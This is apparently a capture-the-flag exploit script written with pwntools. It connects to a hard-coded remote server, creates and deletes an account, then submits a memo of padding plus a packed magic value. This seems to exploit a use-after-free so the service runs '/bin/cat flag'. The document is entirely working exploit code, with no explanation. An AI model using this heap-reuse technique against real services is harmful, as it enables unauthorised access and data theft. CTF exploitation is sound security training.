from pwn import *

# if(main_account && *((_DWORD *)main_account + 16) == 1801680230) { system("/bin/cat flag"); }

local = False
if local == True:
    SERVER = "127.0.0.1"
    PORT = 2323
else:
    SERVER = "88.198.233.174"
    PORT = 33864

r = remote(SERVER, PORT)

memo = "AABACADAEAFAGAHAIAJAKALAMANAOBBCBDBEBFBGBHBIBJBKBLBMBNBOCCDCECFC"
memo += p32(1801680230)

def create_acc(r, fname, lname):
    r.send("1\n")
    r.recvuntil(": ")
    r.send(fname + "\n")
    r.recvuntil(": ")
    r.send(lname + "\n")
    print r.recvuntil("number: ")

def delete_acc(r):
    r.send("3\n")
    print r.recvuntil("number: ")

def add_memo(r, memo):
    r.send("4\n")
    r.recvuntil(":")
    r.send(memo + "\n")
    print r.recvuntil("number: ")


create_acc(r, "sdfdf", "ye")
delete_acc(r)
add_memo(r, memo)
r.send("5\n")
print r.recvn(60, timeout=5)
